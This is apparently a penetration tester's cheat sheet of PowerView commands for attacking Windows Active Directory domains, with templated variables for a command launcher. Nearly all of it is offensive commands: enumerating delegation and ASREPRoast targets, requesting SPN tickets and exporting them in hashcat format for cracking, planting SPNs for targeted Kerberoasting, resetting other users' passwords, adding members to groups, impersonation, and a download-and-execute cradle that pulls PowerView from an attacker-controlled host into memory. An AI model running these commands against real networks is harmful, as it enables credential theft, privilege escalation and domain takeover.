# Powerview

## ldap - enum - powerview - get - local

### AdminCount users

Enumerate AdminCount users with Powerview.

```sh title:"Powerview Enumerate AdminCount Users"
Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
```
<!-- cheat -->

### Unconstrained delegation users

Enumerate unconstrained delegation users with Powerview.

```sh title:"Powerview Enumerate Unconstrained Delegation Users"
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
<!-- cheat -->

### Constrained delegation users

Enumerate constrained delegation users with Powerview.

```sh title:"Powerview Enumerate Constrained Delegation Users"
Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
```
<!-- cheat -->

### ASREPRoast candidates

Enumerate ASREPRoast candidates with Powerview.

```sh title:"Powerview Enumerate ASREPRoast Candidates"
Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
```
<!-- cheat -->

### Unconstrained delegation computers

Enumerate unconstrained delegation computers with Powerview.

```sh title:"Powerview Enumerate Unconstrained Delegation Computers"
Get-DomainComputer -Unconstrained
```
<!-- cheat -->

### ACLs by SID

Enumerate ACLs by SID with Powerview.

```sh title:"Powerview Enumerate ACLs by SID"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
<!-- cheat
var sid
-->

### Object ACL

Read object ACL with Powerview.

```sh title:"Powerview Read Object ACL"
Get-DomainObjectAcl -Identity $user
```
<!-- cheat
var user
-->

### Constrained delegation computers

Enumerate constrained delegation computers with Powerview.

```sh title:"Powerview Enumerate Constrained Delegation Computers"
Get-DomainComputer -TrustedToAuth
```
<!-- cheat -->

## ldap - powerview - misc - local

### CSV export

Read CSV export with Powerview.

```sh title:"Powerview Read CSV Export"
Export-PowerViewCSV
```
<!-- cheat -->

### Resolve hostname

Run resolve hostname with Powerview.

```sh title:"Powerview Run Resolve Hostname"
Resolve-IPAddress
```
<!-- cheat -->

### Convert name to SID

Convert name to SID with Powerview.

```sh title:"Powerview Convert Name to SID"
ConvertTo-SID
```
<!-- cheat -->

### Convert name to SID (var)

Convert name to SID (var) with Powerview.

```sh title:"Powerview Convert Name to SID (var)"
$sid = Convert-NameToSid $target_user
```
<!-- cheat
var target_user
-->

### Convert AD name format

Convert AD name format with Powerview.

```sh title:"Powerview Convert AD Name Format"
Convert-ADName
```
<!-- cheat -->

### Decode UAC value

Decode UAC value with Powerview.

```sh title:"Powerview Decode UAC Value"
ConvertFrom-UACValue
```
<!-- cheat -->

### Add remote connection

Add remote connection with Powerview.

```sh title:"Powerview Add Remote Connection"
Add-RemoteConnection
```
<!-- cheat -->

### Remove remote connection

Remove remote connection with Powerview.

```sh title:"Powerview Remove Remote Connection"
Remove-RemoteConnection
```
<!-- cheat -->

### Impersonate user

Execute impersonate user with Powerview.

```sh title:"Powerview Execute Impersonate User"
Invoke-UserImpersonation
```
<!-- cheat -->

### Revert impersonation

Run revert impersonation with Powerview.

```sh title:"Powerview Run Revert Impersonation"
Invoke-RevertToSelf
```
<!-- cheat -->

### Request SPN ticket

Run request SPN ticket with Powerview.

```sh title:"Powerview Run Request SPN Ticket"
Get-DomainSPNTicket
```
<!-- cheat -->

### Invoke-Kerberoast

Run invoke kerberoast with Powerview.

```sh title:"Powerview Run Invoke Kerberoast"
Invoke-Kerberoast
```
<!-- cheat -->

### Path ACLs

Run path ACLs with Powerview.

```sh title:"Powerview Run Path ACLs"
Get-PathAcl
```
<!-- cheat -->

## ldap - powerview - domain - local

### DNS zones

List DNS zones with Powerview.

```sh title:"Powerview List DNS Zones"
Get-DomainDNSZone
```
<!-- cheat -->

### DNS records

List DNS records with Powerview.

```sh title:"Powerview List DNS Records"
Get-DomainDNSRecord
```
<!-- cheat -->

### Domain

Run domain with Powerview.

```sh title:"Powerview Run Domain"
Get-Domain
```
<!-- cheat -->

### Domain controllers

Run domain controllers with Powerview.

```sh title:"Powerview Run Domain Controllers"
Get-DomainController
```
<!-- cheat -->

### Forest object

Run forest object with Powerview.

```sh title:"Powerview Run Forest Object"
Get-Forest
```
<!-- cheat -->

### Forest domains

Run forest domains with Powerview.

```sh title:"Powerview Run Forest Domains"
Get-ForestDomain
```
<!-- cheat -->

### Global catalogs

Read global catalogs with Powerview.

```sh title:"Powerview Read Global Catalogs"
Get-ForestGlobalCatalog
```
<!-- cheat -->

### Outlier objects

Find outlier objects with Powerview.

```sh title:"Powerview Find Outlier Objects"
Find-DomainObjectPropertyOutlier
```
<!-- cheat -->

### Domain users

Run domain users with Powerview.

```sh title:"Powerview Run Domain Users"
Get-DomainUser
```
<!-- cheat -->

### TGS hashcat for user

Crack TGS hashcat for user with Powerview.

```sh title:"Powerview Crack TGS Hashcat for User"
Get-DomainUser -Identity $user | Get-DomainSPNTicket -Format Hashcat
```
<!-- cheat
var user
-->

### List SPN holders

List SPN holders with Powerview.

```sh title:"Powerview List SPN Holders"
Get-DomainUser * -spn | select samaccountname
```
<!-- cheat -->

### Bulk Kerberoast to CSV

Crack bulk kerberoast to CSV with Powerview.

```sh title:"Powerview Crack Bulk Kerberoast to CSV"
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\users_tgs.csv -NoTypeInformation
```
<!-- cheat -->

### New domain user

Create domain user with Powerview.

```sh title:"Powerview Create Domain User"
New-DomainUser
```
<!-- cheat -->

### Set user password

Set user password with Powerview.

```sh title:"Powerview Set User Password"
Set-DomainUserPassword
```
<!-- cheat -->

### User logon events

Run user logon events with Powerview.

```sh title:"Powerview Run User Logon Events"
Get-DomainUserEvent
```
<!-- cheat -->

### Domain computers

Run domain computers with Powerview.

```sh title:"Powerview Run Domain Computers"
Get-DomainComputer
```
<!-- cheat -->

### Domain object

Run domain object with Powerview.

```sh title:"Powerview Run Domain Object"
Get-DomainObject
```
<!-- cheat -->

### Set SPN on user

Set SPN on user with Powerview.

```sh title:"Powerview Set SPN on User"
Set-DomainObject -Identity $user -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```
<!-- cheat
var user
-->

### Object ACLs

Read object ACLs with Powerview.

```sh title:"Powerview Read Object ACLs"
Get-DomainObjectAcl
```
<!-- cheat -->

### Add object ACL

Add object ACL with Powerview.

```sh title:"Powerview Add Object ACL"
Add-DomainObjectAcl
```
<!-- cheat -->

### Interesting ACLs

Run interesting ACLs with Powerview.

```sh title:"Powerview Run Interesting ACLs"
Find-InterestingDomainAcl
```
<!-- cheat -->

### OUs

List OUs with Powerview.

```sh title:"Powerview List OUs"
Get-DomainOU
```
<!-- cheat -->

### Sites

List sites with Powerview.

```sh title:"Powerview List Sites"
Get-DomainSite
```
<!-- cheat -->

### Subnets

List subnets with Powerview.

```sh title:"Powerview List Subnets"
Get-DomainSubnet
```
<!-- cheat -->

### Domain SID

Run domain SID with Powerview.

```sh title:"Powerview Run Domain SID"
Get-DomainSID
```
<!-- cheat -->

### Domain groups

Run domain groups with Powerview.

```sh title:"Powerview Run Domain Groups"
Get-DomainGroup
```
<!-- cheat -->

### New group

Create group with Powerview.

```sh title:"Powerview Create Group"
New-DomainGroup
```
<!-- cheat -->

### Managed groups

Write managed groups with Powerview.

```sh title:"Powerview Write Managed Groups"
Get-DomainManagedSecurityGroup
```
<!-- cheat -->

### Group members

List group members with Powerview.

```sh title:"Powerview List Group Members"
Get-DomainGroupMember
```
<!-- cheat -->

### Add to group

Add Powerview to group.

```sh title:"Powerview Add to Group"
Add-DomainGroupMember
```
<!-- cheat -->

### File servers

Start file servers with Powerview.

```sh title:"Powerview Start File Servers"
Get-DomainFileServer
```
<!-- cheat -->

### DFS shares

Run DFS shares with Powerview.

```sh title:"Powerview Run DFS Shares"
Get-DomainDFSShare
```
<!-- cheat -->

## ldap - powerview - gpo - local

### GPO objects

Run GPO objects with Powerview.

```sh title:"Powerview Run GPO Objects"
Get-DomainGPO
```
<!-- cheat -->

### GPO local groups

Set GPO local groups with Powerview.

```sh title:"Powerview Set GPO Local Groups"
Get-DomainGPOLocalGroup
```
<!-- cheat -->

### Map user to local groups

Run map user to local groups with Powerview.

```sh title:"Powerview Run Map User to Local Groups"
Get-DomainGPOUserLocalGroupMapping
```
<!-- cheat -->

### Map computer's local groups

Run map computer's local groups with Powerview.

```sh title:"Powerview Run Map Computer's Local Groups"
Get-DomainGPOComputerLocalGroupMapping
```
<!-- cheat -->

### Default policy

Run default policy with Powerview.

```sh title:"Powerview Run Default Policy"
Get-DomainPolicy
```
<!-- cheat -->

## ldap - enumeration - powerview - computer - local

### Local groups

Enumerate local groups with Powerview.

```sh title:"Powerview Enumerate Local Groups"
Get-NetLocalGroup
```
<!-- cheat -->

### Local group members

Enumerate local group members with Powerview.

```sh title:"Powerview Enumerate Local Group Members"
Get-NetLocalGroupMember
```
<!-- cheat -->

### Net shares

Enumerate net shares with Powerview.

```sh title:"Powerview Enumerate Net Shares"
Get-NetShare
```
<!-- cheat -->

### Logged on users

Enumerate logged on users with Powerview.

```sh title:"Powerview Enumerate Logged on Users"
Get-NetLoggedon
```
<!-- cheat -->

### Net sessions

Show net sessions with Powerview.

```sh title:"Powerview Show Net Sessions"
Get-NetSession
```
<!-- cheat -->

### Reg logged on

Enumerate reg logged on with Powerview.

```sh title:"Powerview Enumerate Reg Logged on"
Get-RegLoggedOn
```
<!-- cheat -->

### RDP sessions

Enumerate RDP sessions with Powerview.

```sh title:"Powerview Enumerate RDP Sessions"
Get-NetRDPSession
```
<!-- cheat -->

### Test admin access

Enumerate test admin access with Powerview.

```sh title:"Powerview Enumerate Test Admin Access"
Test-AdminAccess
```
<!-- cheat -->

### Computer site

Enumerate computer site with Powerview.

```sh title:"Powerview Enumerate Computer Site"
Get-NetComputerSiteName
```
<!-- cheat -->

### WPAD / proxy

Read WPAD / proxy with Powerview.

```sh title:"Powerview Read WPAD / Proxy"
Get-WMIRegProxy
```
<!-- cheat -->

### Last logged-on user

Enumerate last logged on user with Powerview.

```sh title:"Powerview Enumerate Last Logged on User"
Get-WMIRegLastLoggedOn
```
<!-- cheat -->

### Cached RDP connections

Enumerate cached RDP connections with Powerview.

```sh title:"Powerview Enumerate Cached RDP Connections"
Get-WMIRegCachedRDPConnection
```
<!-- cheat -->

### Mounted drives

Enumerate mounted drives with Powerview.

```sh title:"Powerview Enumerate Mounted Drives"
Get-WMIRegMountedDrive
```
<!-- cheat -->

### Process list with owners

List process list with owners with Powerview.

```sh title:"Powerview List Process List with Owners"
Get-WMIProcess
```
<!-- cheat -->

### Find files

Find files with Powerview.

```sh title:"Powerview Find Files"
Find-InterestingFile
```
<!-- cheat -->

## ldap - powerview - meta - local

### Find user logon

Find user logon with Powerview.

```sh title:"Powerview Find User Logon"
Find-DomainUserLocation
```
<!-- cheat -->

### Find process

Find process with Powerview.

```sh title:"Powerview Find Process"
Find-DomainProcess
```
<!-- cheat -->

### Find user events

Find user events with Powerview.

```sh title:"Powerview Find User Events"
Find-DomainUserEvent
```
<!-- cheat -->

### Find shares

Find shares with Powerview.

```sh title:"Powerview Find Shares"
Find-DomainShare
```
<!-- cheat -->

### Find share files

Find share files with Powerview.

```sh title:"Powerview Find Share Files"
Find-InterestingDomainShareFile
```
<!-- cheat -->

### Find local admin

Find local admin with Powerview.

```sh title:"Powerview Find Local Admin"
Find-LocalAdminAccess
```
<!-- cheat -->

### Domain local group members

Run domain local group members with Powerview.

```sh title:"Powerview Run Domain Local Group Members"
Find-DomainLocalGroupMember
```
<!-- cheat -->

## ldap - powerview - domain trusts - local

### Domain trusts

Run domain trusts with Powerview.

```sh title:"Powerview Run Domain Trusts"
Get-DomainTrust
```
<!-- cheat -->

### Forest trusts

Run forest trusts with Powerview.

```sh title:"Powerview Run Forest Trusts"
Get-ForestTrust
```
<!-- cheat -->

### Foreign users

Run foreign users with Powerview.

```sh title:"Powerview Run Foreign Users"
Get-DomainForeignUser
```
<!-- cheat -->

### Foreign group members

Run foreign group members with Powerview.

```sh title:"Powerview Run Foreign Group Members"
Get-DomainForeignGroupMember
```
<!-- cheat -->

### Trust mapping

Start trust mapping with Powerview.

```sh title:"Powerview Start Trust Mapping"
Get-DomainTrustMapping
```
<!-- cheat -->

### Reset password

Dump reset password with Powerview.

```sh title:"Powerview Dump Reset Password"
$newpass = ConvertTo-SecureString '$target_pass' -AsPlainText -Force; Set-DomainUserPassword -Identity $target_user -AccountPassword $newpass -Verbose
```
<!-- cheat
var target_user
var target_pass
-->

### Add user to group

Add user to group with Powerview.

```sh title:"Powerview Add User to Group"
Add-DomainGroupMember -Identity $group_name -Members $user -Verbose
```
<!-- cheat
var group_name
var user
-->

### Confirm membership

Read confirm membership with Powerview.

```sh title:"Powerview Read Confirm Membership"
Get-DomainGroupMember -Identity $group_name | select MemberName
```
<!-- cheat
var group_name
-->

### Clear SPNs

Run clear SPNs with Powerview.

```sh title:"Powerview Run Clear SPNs"
Set-DomainObject -Identity $user -Clear serviceprincipalname -Verbose
```
<!-- cheat
var user
-->

### Remove from group

Remove Powerview from group.

```sh title:"Powerview Remove from Group"
Remove-DomainGroupMember -Identity $group_name -Members $user -Verbose
```
<!-- cheat
var group_name
var user
-->

## powerview - bootstrap

### In-memory load

Start Powerview in memory load.

```powershell title:"Powerview Start in Memory Load"
(New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/PowerView.ps1') | IEX
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Build PSCredential object

Build PSCredential object with Powerview.

```powershell title:"Powerview Build PSCredential Object"
$passwd = ConvertTo-SecureString '$pass' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ('$domain\$user', $passwd)
```
<!-- cheat
import domain_ip
var user
var pass
-->

### Convert SID to name

Convert SID to name with Powerview.

```powershell title:"Powerview Convert SID to Name"
ConvertFrom-SID $sid
```
<!-- cheat
var sid
-->

### Find managed security groups

Find managed security groups with Powerview.

```powershell title:"Powerview Find Managed Security Groups"
Find-ManagedSecurityGroups | select GroupName
```
<!-- cheat -->

